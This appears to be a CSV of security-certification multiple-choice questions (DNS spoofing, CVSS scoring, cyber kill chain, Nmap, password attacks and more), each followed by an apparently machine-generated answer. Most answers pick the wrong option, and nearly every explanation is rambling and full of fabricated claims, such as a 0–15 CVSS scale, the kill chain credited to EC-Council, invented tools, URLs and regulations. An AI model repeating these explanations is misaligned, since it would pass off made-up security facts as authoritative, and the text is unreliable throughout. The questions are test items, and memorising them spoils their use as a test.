index,question,llm_answer
42,"In the field of cryptanalysis, what is meant by a ?rubber-hose"" attack?
A.  Attempting to decrypt cipher text by making logical assumptions about the contents of the original plaintext.
B.  Extraction of cryptographic secrets through coercion or torture.
C.  Forcing the targeted key stream through a hardware-accelerated device such as an ASIC.
D.  A backdoor placed into a cryptographic algorithm by its creator.
","
the correct answer is b. there are some circumstances in which a human can decrypt cipher text simply because they have seen enough. this is not a good approach to taking a cryptographic key. it ’ s also not good for extracting actual data from cipher text because every attempt to decrypt it involves only a portion of the key being provided. a so-called human-aided cryptanalysis attack can not be implemented using a computer. as a matter of fact, you ’ d be hard pressed to find a single study that uses human-assisted cryptanalysis. it can be used to determine the existence of a few specific cases : 1 ) the attacker and human have seen the same plaintext value twice and, based on a particular assumption about the random nature of random numbers, come up with the key. 2 ) the human is seeing more plaintext than expected and, based on the random nature of the cycle, comes up with the key. and 3 ) a person is providing information that a computer shouldn ’ t see. human-assisted cryptanalysis can not be used as a general purpose tool because it ’ s not good all the time, most of the time, or in general. it just won ’ t work very well with really strong keys. human-assisted cryptanalysis can be used to determine whether a potential attack may have a basis in reality : a question about a company ’ s normal practices pops up and, according to the agreement between test group member and attacker, they both see a key to"
43,"The network team has well-established procedures to follow for creating new rules on the firewall. This
includes having approval from a manager prior to implementing any new rules. While reviewing the firewall
configuration, you notice a recently implemented rule but cannot locate manager approval for it. What would
be a good step to have in the procedures for a situation like this?
A.  Have the network team document the reason why the rule was implemented without prior manager approval.
B.  Monitor all traffic using the firewall rule until a manager can approve it.
C.  Do not roll back the firewall rule as the business may be relying upon it, but try to get manager approval as soon as possible.
D.  Immediately roll back the firewall rule until a manager can approve it
","
the correct answer is d. one of the reasons for rolling back a firewall rule without having manager approval is that managers may be looking for reasons to dismiss a finding on a rule. if the finding is related to security, the manager may be inclined to do something about it. not only does the rule still be in place, but any action taken using the rule may be tracked back to the manager. a manager may be inclined to resolve this finding immediately, which may result in not rolling the rule back. potentially, the finding may be ignored, but that ’ s not guaranteed. the whole purpose of a rule in this situation is to resolve a finding, not to cause damage to the business or to maintain a risk level. having a procedure for addressing this type of thing may save the organization from a lot of trouble. as a side note, trying to have approval from a manager for every new rule on the firewall is about impossible, which is why these types of procedures are so valuable. the more rules you try to put into place, then the more chances for error. these types of procedures should be created for monitoring and maintaining a secure network. as a side note here, trying to find someone to approve that new rule requires some people to be aware and attentive. if there is a known risk that requires a response just outside of the approved timescale, doing anything to avoid that requirement, no matter how unjustified it may be, is more important. the difference is the approval of the new"
44,"Susan, a software developer, wants her web API to update other applications with the latest information. For
this purpose, she uses a user-defined HTTP tailback or push APIs that are raised based on trigger events: when
invoked, this feature supplies data to other applications so that users can instantly receive real-time
Information.
Which of the following techniques is employed by Susan?
A.  web shells
B.  Webhooks
C.  REST API
D.  SOAP API
","
the correct answer is b. web hooks are a way for web applications, also known as web services, to communicate with other systems outside the web. this is made possible by an http tailback or push APIs, which are raised on trailing command and handle data from the outside. web hooks are defined in rss 1.1 and subsequently specified in rss 2.0. with the release and growth of google appstore and other web hook implementations, web hooks fell out of favor among web app developers. as a side note, rest apis are a way of implementing http APIs using a different architecture. both rest and http would need to be examined for sensitive data and processing requirements. soap is an internet protocol designed to transfer structured data in a xml format. for example, you would use a soap server to process financial data. xml is a way of packaging data in a structured manner and is compatible with both http and soap. therefore, you would use xml to process http and so on. if you were to tell someone you wanted them to enter your username and password to get a updated version of your evil twin attack tool, you would use a web feature to accomplish that. the web feature would provide a means for the user to connect to the evil twin attack tool site. finally, soap is used for web services. an http server, such as apache, would be used in front of a soap server for web services. other servers, such as nginx, would consume http requests for soap actions"
45,"What is the first step for a hacker conducting a DNS cache poisoning (DNS spoofing) attack against an
organization?
A.  The attacker queries a nameserver using the DNS resolver.
B.  The attacker makes a request to the DNS resolver.
C.  The attacker forges a reply from the DNS resolver.
D.  The attacker uses TCP to poison the ONS resofver.
","
the correct answer is b. dns spoofing is the use of dns to send messages to targets inside your network. the attacker queries the nameserver ( the resolver ) using the local computer ’ s dns program ( e.g., arpsnmp.py ). the query can include a request to fetch multiple files, which could contain executable operations. if the nameserver ( the resolver ) sees this query, it will respond with a different ip for each query. they ’ ll probably respond somewhere other than the target, but the idea is the query will identify a hostname and ip address for the target. the attacker then uses the spoofed hostname and ip to get access to the network. it does this by updating the ttl on that hostname to a low value. because of the nameserver not seeing the bogus request, the response will be received and execute. if the user connects to the hacked hostname, he ’ s connected to a malicious ip address. therefore, the first step for dns spoofing is to query the nameserver using the local computer ’ s dns program. the following is from owasp ’ s dns spoofing chapter ( url past the break due to length : ) “ dns spoofing makes use of the dns server to send messages to targets inside the network. an attacker uses the local dns program ( such as arpsnmp.py ) to query a local dns server ( perhaps running as a built-in dns program on a linux system ) using a query such as "" send a reply"
46,"Ricardo has discovered the username for an application in his targets environment. As he has a limited amount
of time, he decides to attempt to use a list of common passwords he found on the Internet. He compiles them
into a list and then feeds that list as an argument into his password-cracking application, what type of attack is
Ricardo performing?
A.  Known plaintext
B.  Password spraying
C.  Brute force
D.  Dictionary
","
the correct answer is b. once again, we ’ re back to a common question/double question regarding tools and attacks : how do you choose which attack to use? you have a collection of tools, log information from target sites, and one tool specifically—attacksidekick. you add that extra ability by selecting a password-cracking tool. per previous security observations, you have discerned there are common passwords and a way to generate and use a list of them—password spraying. assuming ricardo does something similar with “ common pass-words ” ( or at least one of them ; he may have thrown another one or to be fair, a bunch of them, depending on how the attack is defined ), the target web sites can ’ t defend against this attack ; that, at least, to go by the explanation, seems reasonable. a second point related to this—is the list of passwords really good for anything? with effort, after all, there is probably a different “ common ” password created daily, on a yearly basis, and listed in the list of passwords in august 2012 is jodie, jason, and jules. hahaha. not really funny, i guess, but you get the point : the key is to the method behind the attack ; the tool—attacksidekick—inand itself isn ’ t what matters as much as the way the tool is used. as a side note here, there are some questions and comments on this page that are picky"
47,"Sam is working as a system administrator In an organization. He captured the principal characteristics of a
vulnerability and produced a numerical score to reflect Its severity using CVSS v3.0 to property assess and
prioritize the organization's vulnerability management processes. The base score that Sam obtained after
performing cvss rating was 4.0. What is the CVSS severity level of the vulnerability discovered by Sam in the
above scenario?
A.  Medium
B.  Low
C.  Critical
D.  High
","
the correct answer is c. cvss is a quality assurance process for identifying and assessing vulnerability to attackers. each measurement or “ score ” is assigned to a level, which represents the severity of the vulnerability and the level at which it should be negotiated. the higher the score, the more the vulnerability is desired by an attacker. cvss v2 used integer values for scoring, and v3 uses a scale of 0–15 ; 0 being no severity impact and 15 being severely compromised. additionally, cvss scoring at this level gives a true view of the actual severity of the vulnerability. in this example, sam was able to generate a numerical score ranging from 4.0 ( moderate ) to 15.0 ( severely compromised ). this makes sense because attackers are generally motivated by the highest score they can get, and this score was exactly what sam wanted. referencing the cvss website ( url cvss.org/cvss-rater ), we can see that the different scores listed from highest to lowest are as follows : • severity : • low : 4 • medium : 15 • high : 0 • severe : 20 • life : • low : 2 • medium : 15 • high : 0 • severe : 20 in addition to the whole severity scale being created by cvss, which allows a determination of the level at which the severity of the vulnerability was determined and maintained by an independent team, there are also methods of calculating the severity of"
48,"How is the public key distributed in an orderly, controlled fashion so that the users can be sure of the sender?s
identity?
A.  Hash value
B.  Private key
C.  Digital signature
D.  Digital certificate
","
the correct answer is a. digital signatures are used to authenticate messages signed with a private key. since there is only one private key, this makes sense. the key that needs to be provided to the recipient is the public key, which is stored in a digital certificate. this is not a means to identify the owner of the key. it just identifies the resource. a hash value is a value that is computed from some data and is itself another data value. unlike the key, which is a key to a lock, the hash value is the key to a certificate. the certificate holds the public key. a certificate is not a means to identify someone ; it simply provides a means to identify the content of the certificate. there are several reasons for using digital certificates in this manner. first, any old way to send encrypted messages involves the sender handholding the recipient ’ s identity ; in other words, the sender trusts the recipient. assuming the communication is intended and the internet exists, this can be trusted. second, some people just don ’ t want to hand their private key around on a piece of paper. it would likely be stolen or given away, or just simply lost. a digital certificate solves that problem by storing the key in a trusted location. finally, some people just don ’ t want to install or think about installing verified sources, which includes cryptographic keys. a digital certificate solves that problem by providing a means to identify the holder of a private key. a certificate does require a"
49,"At what stage of the cyber kill chain theory model does data exfiltration occur?
A.  Actions on objectives
B.  Weaponization
C.  installation
D.  Command and control
","
the correct answer is b. at the initiation stage, when the attacker is gaining access to the target ’ s system. as data is exfiltrated, it ’ s transferred from the tool or malicious software ( ms ) to the attacker, or even directly to an attacker target. at this stage, the weaponization stage is not relevant. command and control is an active tool, which means it is used to communicate with the target ’ s system. even if the tool is sending data directly to an attacker, that wouldn ’ t mean the weaponization stage was reached. the weaponization stage comes ultimately from the exfiltration stage. the weaponization stage is where the tool or malicious software ( ms ) will be used to communicate with or attack the target system. this would be the stage at which devices would be wired to a target and monitoring start. the weaponization stage occurs just before the exfiltration stage. just as an aside, and a useful reminder for your exam, remember that the cyber kill chain is a structured methodology for explaining how a cyberattack happens. designed by ec-council, it helps security teams and organizations better understand and prepare for attacks. a cycle through each of the stages best correlates with the stages of the business cycle, which is a helpful reminder for you. most of the time, weaponization doesn ’ t occur directly from initiation to exfiltration ; however, in the real world, the weaponization stage is linked just before exfiltration. in this attack"
50,"Steven connected his iPhone to a public computer that had been infected by Clark, an attacker. After
establishing the connection with the public computer, Steven enabled iTunes WI-FI sync on the computer so
that the device could continue communication with that computer even after being physically disconnected.
Now, Clark gains access to Steven?s iPhone through the infected computer and is able to monitor and read all
of Steven?s activity on the iPhone, even after the device is out of the communication zone.
Which of the following attacks is performed by Clark in above scenario?
A.  IOS trustjacking
B.  lOS Jailbreaking
C.  Exploiting SS7 vulnerability
D.  Man-in-the-disk attack
","
the correct answer is d. of the choices presented, only the man-in-the-disk ( mitd ) attack exists in a fully connected world where every device has a connection handle. in other words, you need to know what tcp and ip all about in order to perform a mitd attack. as a side note, you can ’ t read steven? s active connection points from it itespeed ; it only gives you the longest connection, which is what a mitd attack tells you. as a final note, it ’ s really what the attacker sees and not what it thinks. just thinking is not the same as being in it, and seeing something is not the same as being in it. in other words, if clark knows that steven ’ s connection point is named dick ’ s laptop, then just knowing he has a connection doesn ’ t mean anything. see, if it were named steve ’ s laptop, then knowing it has a connection name would be useful. the point is, mitd attacks don ’ t really involve what the attacker sees or thinks ; it ’ s more about the connections themselves. explain this to your student and watch for its appearance in the real world. check out mitd attacks here : http brianpang.com/papers/mitd.html )? question vault provides all types of cheating in the real world—fake news, fake news stories, and all kinds of fake something, and a man-in-the-disk ( mitd"
51,"During the process of encryption and decryption, what keys are shared?
A.  Private keys
B.  User passwords
C.  Public keys
D.  Public and private keys
","
the correct answer is b. in cryptography, there are two keys for every encryption process. one of them is called the public key, which is used with messaging protocols like smtp and tcp in smtp transmit. it ’ s not used for decryption in this case. the other key is called the private key and is used for decryption only when we are talking encryption by one key. for example, if we use michael ’ s private key, any decryption would need his public key, which is 8000. for example, if we use jill ’ s public key, then decryption would need jill ’ s private key. of course, the private key is kept secret and only used for encryption purposes. because it is kept secret, this whole encryption process can not be crashed or hacked into happen. if many people had this private key, any attempt to decrypt any message meant the same person would be able to see all messages coming from each person, regardless of the sender. if several people had the public key of someone, then any message sent from the owner of that public key would also be visible to all the recipients of that message. this makes sense because the same is true in medicine—because a person knows only their private key, any attempt to decrypt any message coming from it requires the corresponding public key of the owner of the private key. if several people know the public key of someone, then any message sent from anyone could be seen by everyone using the public key in that message. this"
52,"Abel, a cloud architect, uses container technology to deploy applications/software including all its
dependencies, such as libraries and configuration files, binaries, and other resources that run independently
from other processes in the cloud environment. For the containerization of applications, he follows the five-tier
container technology architecture. Currently. Abel is verifying and validating image contents, signing images,
and sending them to the registries. Which of the following tiers of the container technology architecture Is
Abel currently working in?
A.  Tier-1: Developer machines
B.  Tier-4: Orchestrators
C.  Tier-3: Registries
D.  Tier-2: Testing and accreditation systems
","
the correct answer is d. abel is already known about, tested, and verified within the network. she specifically being concerned about registries and the integrity of the data they hold can result in fraud and financial loss. using an accredited registry. to make things even better tip top, most registries already validate and verify source and destination ports before handing over the stored objects. one of the best registrys in the cloud to concentrate your efforts is amazon ec2. now ( and a fun part of learning ), you could be doing any of the previous actions from within the cloud, not just monitoring and testing applications within the cloud, but also registering and verifying image contents, libraries, and related resources. one last important note on this topic is that any and all testing should always come back around to security. trust your intuitions, people, experiences, and instincts about what the cloud is all about, and not just sticking entirely into security. abel probably already knows that security in the cloud is still a challenge, and maintenance of an image, library, or application is no different than any other process or action. the point is that you should take any and all testing back to security as soon as possible. it ’ s your only responsibility now. don ’ t forget that security in the cloud is still a challenge, but finding and putting security in the cloud can be even worse than finding it in the cloud. as a matter of fact, putting security in the cloud can be worse"
53,"What do Trinoo, TFN2k, WinTrinoo, T-Sight, and Stracheldraht have in common?
A.  All are hacking tools developed by the legion of doom
B.  All are tools that can be used not only by hackers, but also security personnel
C.  All are DDOS tools
D.  All are tools that are only effective against Windows
E.  All are tools that are only effective against Linux
","
the correct answer is b, e. some of the options listed are really hacking tools in their own right ( trinoo, tfn2k, wintrinoo, and tfn2k ), but all of them are also capable of being used as hacking tools against other systems ( depending on how the programmer intended ). some of them are also capable of being used not only against windows, but also linux. all of them ( with the exception of trinoo, which is now a free product on the market ) are developed by the same people ( the legion of doom ) and use essentially the same architecture. all of them can be used not only by hackers, but also security personnel. they are not specifically hacking tools only hackers would use them for. some of them even have windows native applications. how do you know they are hacking tools? well, most of them have certificates describing how to exploit existing vulnerabilities in winnt. some of them even may give you a better view of the local network architecture. there is no such thing as a hacker who doesn ’ t also be a security person. tfn2k is one of the more popular ones in this category. it can be used not only on windows, but also linux. it ’ s developed by two people, with contributions from other individuals and groups. the source code is open, and the website is open as well. tfn2k is, according to its website ( www.tfs.net ),"
54,"Larry, a security professional in an organization, has noticed some abnormalities In the user accounts on a web
server. To thwart evolving attacks, he decided to harden the security of the web server by adopting a
countermeasures to secure the accounts on the web server.
Which of the following countermeasures must Larry implement to secure the user accounts on the web server?
A.  Enable unused default user accounts created during the installation of an OS
B.  Enable all non-interactive accounts that should exist but do not require interactive login
C.  Limit the administrator or toot-level access to the minimum number of users
D.  Retain all unused modules and application extensions
","
the correct answer is c. an enterprise would use multiple countermeasures to protect against user account tampering. a common countermeasure is to allow new accounts only after some number of checks are made on existing accounts, using a suspend, lock, or forget password option. other countermeasures include enabling all non-interactive accounts and allowing rename, delete, and change current directory rights to the user when adding, changing, and removing users on a linux system. the idea is to provide the users with the ability to control their accounts, within the limits of security and compliance requirements. a successful account tamper attempt on a web server would probably attempt to change the passwords current directory to one the attacker wants. semphinity, wps, and metasploit all provide support for various check constraints on accounts, as well as many other features. and a user after some effort on your part can almost find a reliable control folder to toss the user logs in. lastly, remember that security is very much about being aware and taking steps to catch problems as they occur. to do that, you need to track changes to files, logs, and other records around your network. and you ’ ll need strong, configurable passwords and good authentication measures to protect those records and accounts. there may be some some resistance to account change and creation creation, but in the grand scheme of things it ’ s relatively small. most organizations want their users secure and by default, which usually means no user accounts should be created"
55,"In order to tailor your tests during a web-application scan, you decide to determine which web-server version
is hosting the application. On using the sV flag with Nmap. you obtain the following response:
80/tcp open http-proxy Apache Server 7.1.6
what Information-gathering technique does this best describe?
A.  WhOiS lookup
B.  Banner grabbing
C.  Dictionary attack
D.  Brute forcing
","
the correct answer is d. nmap uses a different approach every time it runs. each new run takes into account factors such as time since the server changed, what the server was recently up to, and a variety of other factors. in this case, the request was asking for information about the version number of the server. a dns lookup can be used to identify information about a domain and corresponding ip addresses for that domain. a banner grab is taking the text of the first banner ( welcome message of the first attack ) and comparing the text to a collection of banners. a dictionary attack is looking at a list of word lists, including brute-force derivative words to identify possible passwords. in a brute-force attack, you are using numerical values ( passwords ) to represent things ( banners ). per host, mean that you are looking at the banners of all the hosts in the scan. in a brute-force dictionary, you are using a list of word passwords to help identify a banner. for example, you might use the word list {""day"", ""night"", {""today is the best day : }, followed by a banner. nmap would attempt to guess what the password might be based on these banners. other mean technique s include sniffing and injecting code into the network. sniffing is looking at traffic between the system and other networks. injecting is putting code into other systems to carry out the attack objectives. for example, you might inject a tool that would grab banners, send them to a server"
56,"what is the port to block first in case you are suspicious that an loT device has been compromised?
A.  22
B.  443
C.  48101
D.  80
","
the correct answer is b. the source port in a tcp handshake is 443. the sequence number is not shown and wouldn ’ t be relevant in this context. in addition to the questions regarding port numbering, there are a couple more regarding source and destination insensitivity. see http : //www.sslstrip.com/, and the start of the lesson indicates that we ’ re viewing some material from the source and destination insensitive port range of interest. per the site, “ sslstrip.com provides a tool that allows someone to redirect traffic from one port to another. all designs for internet-connected devices are currently sensitive to any port range, which typically includes 0. 0. 0. 999. if a device is suspicious due to a port range that ’ s not being respected, we ’ d use sslstrip. ” you probably saw that was a lot of information when you got this lesson, so let ’ s try to simplify it. the lesson is simply titled port smuggling, and the goal is to see if understanding how port smuggling works any better helps you identify your victims. see that port range shown around the middle of the country? that ’ s where most folks would be interested in having a device. the lesson asserts that using sslstrip, the location where source and destination insensitive ranges are most helpful, means the following command may be of some use in attempting to gain access to a system. supposing the location successfully connects to the target ’ s default port, you ’ ll have"
57,"A newly joined employee. Janet, has been allocated an existing system used by a previous employee. Before
issuing the system to Janet, it was assessed by Martin, the administrator. Martin found that there were
possibilities of compromise through user directories, registries, and other system parameters. He also
Identified vulnerabilities such as native configuration tables, incorrect registry or file permissions, and
software configuration errors. What is the type of vulnerability assessment performed by Martin?
A.  Credentialed assessment
B.  Database assessment
C.  Host-based assessment
D.  Distributed assessment
","
the correct answer is d. the assessment of system or computer technology on a employee ’ s performance is called a risk assessment. the assessor is evaluating the risks to the organization and providing a reasonable view of the risks. in this particular assessment, martin ’ s examination of the system and its associated resources was providing the details to decide whether the new employee was a suitable person to join the organization. there are several types of assessments. most of them are detailed in iisec.com ’ s security assessment handbook. a credentialed assessment is one conducted by a certified ethical hacker ( usually martin ), who has some trust and credibility within the organization. he or she makes use of some existing resources and information, but not necessarily blindly. in other versions of the assessment, database, and host ( dt & oh ) assessments, a third party is conducting the assessment and will normally provide the details on a client ’ s systems and its role is very similar to that of a certified ethical hacker. a host-based assessment is similar to a dt & oh assessment, but the assessor is examining the client ’ s own tools and procedures directly. a system assessment ( sometimes called a vulnerability assessment ) is used in an attempt to identify vulnerable systems, applications, and configurations. it should match the actual assessment done by a certified ethical hacker. a general assessment covers all areas and points to no specific weaknesses, while a specialized assessment can be used to assess a new system to see if it ’ s suitable for the"
58,"You are a penetration tester working to test the user awareness of the employees of the client xyz. You
harvested two employees' emails from some public sources and are creating a client-side backdoor to send it to
the employees via email. Which stage of the cyber kill chain are you at?
A.  Reconnaissance
B.  Command and control
C.  Weaponization
D.  Exploitation
","
the correct answer is c. the weaponization stage of the cyber kill chain is where you take the malicious software ( weapon ) you create in the command and control ( c & c ) stage and send it to the target ’ s employees in the sit - up ( exploitation ) stage. sending the malware to the target ’ s employees is accomplishing the weaponization/distribution stage. you ’ ll probably see weaponization discussed in the ec-council certification material as being in the acquisition ( getting ) stage of the cyber kill chain. in fact, you ’ ll probably see it mentioned as being in the acquisition, delivery, and exploitation ( Wade ) stage. one more important point on weaponization from your exam is that you won ’ t definitely get it done in the exam room ; it ’ ll be a little bit harder to pull it off in reality. in the first place, you won ’ t know the target ’ s email addresses or link to anything until you get the malicious software on them, so you ’ ll probably be putting the software on something eventually. in the real world, weaponization is a little harder than you might think ; however, you do need to get it done correctly to pass your exam. here are some tips on doing that : • determine what target organization you want to attack. watch and observe people and see what habits and behaviors you ’ d need to observe. gather emails from public sources and watch what links and websites they used. • create the malware. you don"
59,"Which file is a rich target to discover the structure of a website during web-server footprinting?
A.  Document root
B.  Robots.txt
C.  domain.txt
D.  index.html
","
the correct answer is b. the robots.txt file is located in the root of every website. you would use it to indicate to search engines how to find specific pages on your site. a website could have multiple robots.txt files, but usually there is one at the root. based on this, you could guess that finding the document root was so important. the other answers are not rich target targets. the domain.txt file would be used to identify information about the domain, including the domain name and possibly the postal code. the website could have multiple domain.txt files, one for each address. while you could gather information from the robots.txt file, it wouldn ’ t be a rich target. the other two are not target files in this sense. the document root is identified by using a high-level domain name and looking down to get to the website. in this example, the answer would be the domain txt file. there may be multiple levels, but that ’ s not what the question is asking. the point is to get the domain changed to something that may be easier to recognize or get a different response. the idea is to get the device to do something it shouldn ’ t be doing, which requires the location of the document root. a robot.txt file would be no more useful than a password on a cell phone because it has no relevance to the device. it may have some relevance to some systems, but not to a phone. the point is to get the device to do what you want"
60,"Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on
the network lo identify the active systems, network services, applications, and vulnerabilities. He also obtained
the list of the users who are currently accessing the network. What is the type of vulnerability assessment that
Morris performed on the target organization?
A.  internal assessment
B.  Passive assessment
C.  External assessment
D.  Credentialed assessment
","
the correct answer is d. this is another easy one, but it ’ s still valuable. the assumptions on a credential-assigned vulnerability scan are the same as the internal scan described in the self-study book : the organization is interested in identifying active connections on the network, which can be used to determine the locations of available vulnerabilities. assuming the organization has a list of the users as well as the vulnerabilities, it ’ s fairly easy. the only thing missing here is any calculation on the part of the hacker—assuming he isn ’ t actually working remotely and just looking at the results of the scan. assuming the users are listed in order, the vulnerable connections would be assigned based on the connections made by the active connections. easy enough, right? except most organizations won ’ t provide the actual location of the resources in the network. while a tool like snort can identify open ports and connectedness among them, in the real world of business and not just on a test exam, that ’ s not really useful information. a local vulnerability scanner won ’ t see open ports they ’ ve already locked down and probably won ’ t see any new packets coming along as a result of the scan ; nor will it provide any real data on closed ports and unavailable vulnerabilities. a tool that sees the location of the resources will provide the actual location of those vulnerabilities on the network. vendors often provide a netcat listener port for internal communication. you can usually find statistics on the internet about the locations of these listeners"
61,"jane, an ethical hacker. Is testing a target organization's web server and website to identity security loopholes.
In this process, she copied the entire website and its content on a local drive to view the complete profile of the
site's directory structure, file structure, external links, images, web pages, and so on. This information helps
jane map the website's directories and gain valuable information. What is the attack technique employed by
Jane in the above scenario?
A.  website mirroring
B.  Session hijacking
C.  Web cache poisoning
D.  Website defacement
","
the correct answer is b. of the choices provided, this one is the best representation of a hacker ’ s local experience and use of tools after a target ’ s website. remember that website mirroring is the process of taking the target website and copying a copy of it to a local location to examine it. in other words, placing a mirror of the site in the local directory for future reference. this attuser in this instance is using website defacement, also known as a session hijack or web cache poisoning attack. all of these attacks involve the hacker ’ s use of the target website to gather useful information. note the use of a local copy of the site in this attack. assuming the attacker has permission ( or useful information from some malicious site logs ) to check the cache, the attacker then uses a variety of attack tools to gain useful information from the cache. in this particular attack, the attacker ’ s attention is now on the website being examined ; therefore, she is looking at its directory, links, and other statistics. on a windows system, the local browser, googlecache, is used to pull the web page, change some settings, and view it “ just as it should be ” ( aka the real site ). in this attack, the local browser is used to grab a copy of the site based on changes in the web page and, more importantly, the cache. seeing www.domain.com as “ a legitimate company ” ( as opposed to www rogue.com, where anything"
62,"What information security law or standard aims at protecting stakeholders and the general public from
accounting errors and fraudulent activities within organizations?
A.  PCI-DSS
B.  FISMA
C.  SOX
D.  ISO/I EC 27001:2013
","
the correct answer is b. the payment data class ( pci-dss ) guidelines are outlined in both reg u-lations and standards. the requirements for monitoring and accounting for fraud and any data breach are implemented under iso/iec 27001:2013 ( also known as iso 27000:2013 ), but the terminology used in each is the same. in short, according to the standards up to sec 13 constitutes a mandatory standard for organizations that are registered or legally operated under the european commission regulation 459/2016 ( res. no. 459/2016 ). additionally, sec 14 states that all persons ( including employees and contractors ) have a duty to maintain confidentiality. even outside of legal and regulatory requirements, traditional toolsets can help in the detection and analysis of data fraud. tools such as splat on mdm ( microsoft management asset database ), and matriarch, which is open-source, will provide you with detailed information including financial information such as total revenue, earnings per share, and number of shares outstanding. other tools including cia ( confidence intelligence ) will help with monitoring by providing a number of tools that can pull data from a variety of sources. some of the more notable sources include cia intuition, cia intellect, and cia intelligence eye. a good start is hopefully to be found on newbusinessinsurance.com : “ investigation into data exfiltration, fraud, and compliance issues—free ” which should get you through"
63,"CyberTech Inc. recently experienced SQL injection attacks on its official website. The company appointed
Bob, a security professional, to build and incorporate defensive strategies against such attacks. Bob adopted a
practice whereby only a list of entities such as the data type, range, size, and value, which have been approved
for secured access, is accepted. What is the defensive technique employed by Bob in the above scenario?
A.  Output encoding
B.  Enforce least privileges
C.  Whitelist validation
D.  Blacklist validation
","
the correct answer is d. validating rules and rules of acceptance/acceptance are part of security planning, and it ’ s likely your exam question will include this type of question. the process of validating rules and rules of acceptance/acceptance is called whitelisting and involves a trusted third party validating data type, size, and value. this third party is known as a validator. if a submission falls through the walls and ends up in a cannibalism pot, however, then whiteness has been lost. associated media may also be viewed as whiteness because they ’ re considered public domain. security acts like whitelisting are used to protect information assets, data integrity, and pointer integrity. one last note on whitelisting is what happened in this question. bob understood the concept of whitelisting and did everything possible to prevent the attacks. cybertech inc. has been using whitelisting since it was founded. because sql injection attacks are one of the most common attacks, bob decided to develop a “ silent ” attack team inside the company to monitor and attack web servers on the website, should he need to resort to stealth. this it provided for straightforward whitelisting in the future. without entry into the walls and a good team like bob, there is a chance sql injection attacks will remain a true threat to any organization. as a side note, whitelisting should not be confused with white box security, which means someone trying to help keep information secret and safe."
64,"A security analyst uses Zenmap to perform an ICMP timestamp ping scan to acquire information related to the
current time from the target host machine.
Which of the following Zenmap options must the analyst use to perform the ICMP timestamp ping scan?
A.  -PY
B.  -PU
C.  -PP
D.  -Pn
","
the correct answer is d. icmp timestamp mode should be set to true. this allows the analyst to use icmp timestamp messages. the other options are not valid in this context. zenmap does have other tcp-related options, but these should be relevant to this question. tcp scan options are different than icmp scan options. an icmp timestamp ping would be using the same tcp headers as an icmp ping, since the entire packet looks the same. only the timestamp field in the packet is changed. with the -py option, zenmap will perform a ping sweep just as an icmp timestamp ping does. the two other options, -pu and -pp, are port uncaching and port scanning. they ’ re not related to icmp timestamp ping. port uncaching does not have anything to do with icmp timestamp ping. just defined in port scanning terms, uncaching is just including ip address mappings in case traffic. doing that without an associated port number to map to is called port hiding. no port mapping was used in the ping scan, nor was any tcp-related header changed in the attempt. icmp timestamp ping uses the same tcp headers as an icmp ping, and the only difference between the two is a change in one little piece of information. when you set the py option, you turn on tcp visualization. just what it ’ seems like a good idea, and a great way to learn, and one of the reasons for taking security lessons. tcp visualization in zenmap is a pretty cool way to visualize all the"
65,"Which of the following antennas is commonly used in communications for a frequency band of 10 MHz to
VHF and UHF?
A.  Yagi antenna
B.  Dipole antenna
C.  Parabolic grid antenna
D.  Omnidirectional antenna
","
the correct answer is b. you will probably see three to fours times in your exam, maybe more, on antennas. a yagi antenna is made up of several elements, but the most common version has five wires wrapped around a rod. the other answers are not antennas. a dipole antenna is either a long wire or a double wire, depending on the ends, which can provide a great signal. the other answers are not antennas. a parabolic grid antenna, however, is made up of a large circular grid on the top and sides with a hole in the middle for the antenna stick you are standing next to. the idea behind this is great when you had a car with a bluetooth connection but not always. just remember this : a yagi antenna is good for a frequency range of 10 mhz to vhf and uhf. a dipole antenna would be good for lower frequencies ( under 50 khz ). a parabola grid antenna is good for higher frequencies ( over 50 khz ). a single antenna stick, no matter what it is—open or covered, with a single antenna in it—is good for any frequency. as an aside, a covered antenna is usually better than an uncovered one because the coverage area is controlled by the roof. as an aside, a good practice is to carry one on multiple places and keep it portable. antennas themselves are not problematic on the exam, but getting the right antenna for the right frequency is absolutely critical."
